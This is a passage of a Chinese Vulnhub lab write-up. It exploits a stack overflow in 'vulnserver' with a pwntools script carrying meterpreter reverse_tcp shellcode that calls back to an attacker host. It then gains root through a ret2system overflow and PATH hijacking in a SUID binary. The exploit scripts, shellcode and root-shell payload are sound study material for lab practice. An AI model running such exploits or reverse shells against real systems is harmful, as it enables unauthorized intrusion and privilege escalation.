+<span class="nf">c9</span>              <span class="no">LEAVE</span>
+<span class="nf">c3</span>              <span class="no">RET</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>很简单，对之前接受的内容直接调用 <strong>strcpy</strong> 复制到局部的 buffer 中，而这个 buffer 的大小只有 36 字节（还有 4 字节保存了 ebx 寄存器）。很容易看出来只要发送的数据长度超过 44 (0x2c) 就会覆盖到 eip。</p>
+<h3 id="动态调试">动态调试</h3>
+<p>简单介绍一下我的调试环境，由于这是一个网络程序，直接在宿主机上调试意味着端口会暴露在整个局域网上，这是很不安全的。当然可以配置防火墙策略来阻止其它主机的访问，但我选择搭建隔离的调试环境。多年的折腾经验下来最终还是使用了 docker，使用了 ubuntu/ubuntu:16.04 的镜像，网络为默认的桥接网络，调试容器的 IP 为 <strong>172.17.0.2</strong>，主机的 IP 为 <strong>172.17.0.1</strong>。在容器内安装了 gdb，gdb-peda；当然，tmux 不能少。</p>
+<p>首先运行 <strong>vulnserver</strong>，接着 gdb-peda attach 上去：</p>
+<p><img src="/images/2020-08-30/gdb_attach.webp" alt="gdb_attach"></p>
+<!-- 这里有一个比较坑的地方，后面单独介绍。 -->
+<p>我对 handleCommand 函数下断点，命令为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">b handleCommand
+</code></pre></td></tr></table>
+</div>
+</div><p>但是仅仅这样是断不下来的，因为 <strong>handleCommand</strong> 函数由 fork 出的子进程处理，但是我 attach 的是父进程，可以在 gdb 内进行以下设置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">set</span> follow-fork-mode child
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="控制-eip">控制 EIP</h4>
+<p>这样 gdb 在 fork 操作之后就会去跟踪子进程，之后输入 &ldquo;c&rdquo;，让程序继续运行。这里尝试构造一个刚好能够溢出返回地址从而控制 EIP 的 payload，预计 EIP 会被写入  0x42424242：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s2">&#34;print(&#39;OVERFLOW &#39;+&#39;A&#39;*35+&#39;BBBB&#39;)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>OVERFLOW AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+{% endblockquote %}</p>
+<p>同时发送：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s2">&#34;print(&#39;OVERFLOW &#39;+&#39;A&#39;*35+&#39;BBBB&#39;)&#34;</span> <span class="p">|</span> ncat 172.17.0.2 <span class="m">1337</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以发现 gdb 这边成功断下来了，按 &ldquo;c&rdquo; 继续执行，成功控制 EIP：</p>
+<p><img src="/images/2020-08-30/write_eip.webp" alt="eip"></p>
+<h4 id="执行-shellcode">执行 shellcode</h4>
+<p>由于该程序没有开启 NX 防护，故栈是可执行的，所以后续将在栈上写入 shellcode 并执行 shellcode。这里 ESP 正好指向写入的位置，首先搜寻 <strong>jmp esp</strong> 作为跳板：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ROPgadget --binary vulnserver --only <span class="s2">&#34;jmp&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="gadgets-information">Gadgets information</h1>
+<p>0x0804903b : jmp 0x8049020
+0x08049260 : jmp 0x80491f0
+0x080493c0 : jmp 0x80493d4
+0x0804929a : jmp esp</p>
+<p>Unique gadgets found: 4
+{% endblockquote %}</p>
+<p>恰好可以找到，地址为 <strong>0x0804929a</strong>。</p>
+<p>接着使用 <strong>msfvenom</strong> 生成 shellcode，这里我选用了 <strong>linux/x86/meterpreter/reverse_tcp</strong>：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.17.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -e x86/shikata_ga_nai -b <span class="s2">&#34;\x00&#34;</span> -f python
+</code></pre></td></tr></table>
+</div>
+</div><p>Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 150 (iteration=0)
+x86/shikata_ga_nai chosen with final size 150
+Payload size: 150 bytes
+Final size of python file: 743 bytes</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xa7\x6d\xef\xe8\xdd\xc7\xd9\x74\x24\xf4\x58\x2b</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x1f\x83\xc0\x04\x31\x50\x11\x03\x50\x11\xe2</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x52\x07\xe5\xb6\xad\x03\x0e\xa5\x9e\xf0\xa2\x40\x22</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x47\x22\x1c\xc3\x6a\x2b\x89\x58\x1d\x80\xa7\x5e\xdc</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb0\xc5\x5e\xcf\x1c\x43\xbf\x85\xfa\x0b\x6f\x0b\x54</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x25\x6e\xe8\x97\xb5\xf5\x2f\x5e\xaf\xbb\xdb\x9c\xa7</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe1\x24\xdf\x37\xbd\x4e\xdf\x5d\x38\x06\x3c\x90\x8b</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd5\x43\x56\xcb\x9f\xfe\xb2\xec\xed\x06\xfc\xf2\x01</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x09\xfe\x7b\xc2\xc8\x15\x77\xc4\x28\xe5\x37\xbb\x63</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x76\xb2\x84\x04\x67\xe7\x8d\x14\x1e\xa5\xe4\x66\x22</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x04\x78\x03\xe5\xee\x7b\xf3\x07\xb6\x7d\x0b\xc8\xc6</span><span class="s2">&#34;</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc6\x0a\xc8\xc6\x38\xc0\x48</span><span class="s2">&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>{% endblockquote %}</p>
+<p>最终的 exploit 如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># p = remote(&#39;192.168.56.121&#39;, 1337)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;172.17.0.2&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+
+<span class="n">jmp_esp_addr</span> <span class="o">=</span> <span class="mh">0x0804929a</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;OVERFLOW &#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mh">0x2c</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804929a</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xda\xd6\xba\x2b\xf9\xa1\x8e\xd9\x74\x24\xf4\x5d</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2b\xc9\xb1\x1f\x31\x55\x1a\x83\xc5\x04\x03\x55</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x16\xe2\xde\x93\xab\xd0\x11\xbf\x5b\x0f\x02\x7c</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf7\xba\xa6\x32\x91\xb3\x47\xff\xde\x53\xdc\x68</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x73\x4a\xe2\x69\xe3\x6f\xe2\x78\xaf\xe6\x03\x10</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x29\xa1\x93\xb4\xe2\xd8\xf2\x74\xc0\x5b\x71\xba</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa3\x42\x37\x4f\x69\x1d\x65\xaf\x91\xdd\x31\xda</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x91\xb7\xc4\x93\x71\x76\x0f\x6e\xf5\xfc\x4f\x08</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x4b\x15\x68\x59\xb4\x53\x76\x8d\xbb\xa3\xff\x4e</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7a\x48\xf3\x51\x9e\x83\xbb\x2f\xac\x1c\x3e\x0f</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x56\x0d\x1b\x19\x46\xb4\x29\x73\x39\xc4\x80\x04</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\x0b\x62\x07\x40\x6a\x2a\x06\xbe\x6d\x4a\xb2</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\x6d\x4a\xc4\x72\xed</span><span class="s2">&#34;</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>打开 <strong>msfconsole</strong> 进行侦听，成功连接，将以上 exploit 的 IP 更换为靶机即可：</p>
+<p><img src="/images/2020-08-30/user.webp" alt="user"></p>
+<p>成功获得 <strong>user.txt</strong>，可见系统的版本很新，看内核版本应该是 debian 9，实际验证确实是。搜索靶机上的 SUID 文件，可以发现有 <strong>printauthlog</strong>，将该文件下载到本地进行分析。</p>
+<h2 id="printauthlog-分析">printauthlog 分析</h2>
+<p>同样是一个 32 位动态链接的 ELF 文件，但是开了 NX 防护。Ghidra 显示栈中的字符串实在是不太行，这里便使用 ida pro 进行反编译。</p>
+<h3 id="静态分析-1">静态分析</h3>
+<p>main 函数真的很简单：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">command</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-7Ch]
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-60h]
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+6Ch] [ebp-10h]
+</span><span class="c1"></span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">&#34;/bin/cat /var/log/auth.log&#34;</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x48u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">checkPassword</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wrong password&#34;</span><span class="p">);</span>
+    <span class="k">else</span>
+      <span class="n">shell</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage: %s password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>checkPassword 逻辑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">checkPassword</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">s1</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+Fh] [ebp-49h]
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-40h]
+</span><span class="c1"></span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;deadbeef&#34;</span><span class="p">);</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span> <span class="mi">9u</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>也是 <strong>strcpy</strong> 使用不当直接栈溢出。这里直接控制 checkPassword 函数的返回地址即可，由于 NX 的缘故不能在栈上直接写 shellcode 了。但是该程序中有 system 函数的地址，只需要将返回地址改成 system 的地址，然后控制其参数即可。</p>
+<p>这里使用了一个技巧叫做命令劫持，即自行创建可执行程序加修改 PATH 来劫持不以 &ldquo;/&rdquo; 开头的命令，这里我使用 &ldquo;puts&rdquo; 的地址作为 system 函数的参数，puts.c 的内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s">&#34;-p&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+  <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>本地编译好得到 puts，上传到靶机。最终构造的 payload 如下，其中 0x08049060 为 system 的地址，0xdeadbeef 只是填充，0x080482c5 指向 &ldquo;puts\x00&rdquo;。为了方便，将内容保存为文件 haha，并上传到靶机。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x44</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049060</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080482c5</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>最终在靶机上执行以下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">chmod +x puts
+<span class="nv">PATH</span><span class="o">=</span>/home/user:<span class="nv">$PATH</span>
+./printauthlog <span class="sb">`</span>cat haha<span class="sb">`</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>成功获得 <strong>root</strong> 权限，可见 <strong>root.txt</strong>。</p>
+<p><img src="/images/2020-08-30/root.webp" alt="root"></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2020-08-30
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/2020-09-06-vulnhub-photographer/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Vulnhub-Photographer</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/2020-08-23-vulnhub-unknowndevice64-2/">
+            <span class="next-text nav-default">Vulnhub-Unknowndevice64_2</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
